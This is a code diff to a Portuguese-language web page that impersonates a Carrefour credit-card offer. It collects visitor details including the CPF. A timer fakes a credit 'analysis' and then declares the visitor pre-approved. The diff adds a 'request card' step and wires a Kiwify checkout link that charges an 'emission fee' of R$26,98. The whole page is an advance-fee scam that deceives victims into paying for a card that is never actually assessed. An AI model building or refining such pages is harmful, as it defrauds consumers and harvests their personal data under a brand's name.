@@ -349,6 +349,13 @@
             margin: 0 auto 20px;
         }
         
+        .request-card-btn {
+            display: none;
+            text-align: center;
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease;
+        }
+        
         .success-message {
             display: none;
             text-align: center;
@@ -560,7 +567,7 @@
                     <div class="benefit">
                         <i class="fas fa-credit-card"></i>
                         <h3>Cartão Isento de Anuidade</h3>
-                        <p>Zero custo de manutenção com pagamento em dia</p>
+                        <p>Zero cost de manutenção com pagamento em dia</p>
                     </div>
                     <div class="benefit">
                         <i class="fas fa-piggy-bank"></i>
@@ -691,11 +698,20 @@
                 <p>Analisando suas informações... Isso pode levar alguns segundos.</p>
             </div>
             
+            <div id="request-card" class="request-card-btn">
+                <p>Seu cartão foi pré-aprovado! Clique no botão abaixo para solicitar.</p>
+                <button id="request-card-btn">
+                    <i class="fas fa-credit-card"></i> Solicitar Cartão
+                </button>
+            </div>
+            
             <div id="success-message" class="success-message">
                 <p><i class="fas fa-check-circle"></i> Parabéns, você tem direito ao cartão Carrefour, de acordo com a análise do seu CPF. Deixe sempre sua fatura em dia. Confiamos em você. Temos uma taxa de envio.</p>
-                <a href=""><button id="checkout-btn" class="checkout-btn">
-                    <i class="fas fa-credit-card"></i> Pagar taxa de emissão R$26,98 e solicitar envio do cartão
-                </button></a>
+                <a href="https://seu-link-kiwify.aqui" id="checkout-link">
+                    <button class="checkout-btn">
+                        <i class="fas fa-credit-card"></i> Pagar taxa de emissão R$26,98 e solicitar envio do cartão
+                    </button>
+                </a>
             </div>
             
             <div class="trust-badges">
@@ -796,8 +812,10 @@
             const prevButtons = document.querySelectorAll('.prev-btn');
             const submitButton = document.getElementById('submit-btn');
             const loadingElement = document.getElementById('loading');
+            const requestCardElement = document.getElementById('request-card');
+            const requestCardButton = document.getElementById('request-card-btn');
             const successMessage = document.getElementById('success-message');
-            const checkoutButton = document.getElementById('checkout-btn');
+            const checkoutLink = document.getElementById('checkout-link');
             
             let currentStep = 0;
             
@@ -917,17 +935,17 @@
                     // Simular processamento
                     setTimeout(function() {
                         loadingElement.style.display = 'none';
-                        successMessage.style.display = 'block';
+                        requestCardElement.style.display = 'block';
                     }, 3000);
                 } else {
                     alert('Por favor, preencha todos os campos obrigatórios.');
                 }
             });
             
-            // Redirecionamento para o checkout
-            checkoutButton.addEventListener('click', function() {
-                alert('Redirecionando para o checkout da Kiwify...');
-                // window.location.href = 'https://seu-link-kiwify.aqui'; // Descomente e adicione seu link
+            // Solicitar cartão
+            requestCardButton.addEventListener('click', function() {
+                requestCardElement.style.display = 'none';
+                successMessage.style.display = 'block';
             });
             
             // Inicializar barra de progresso
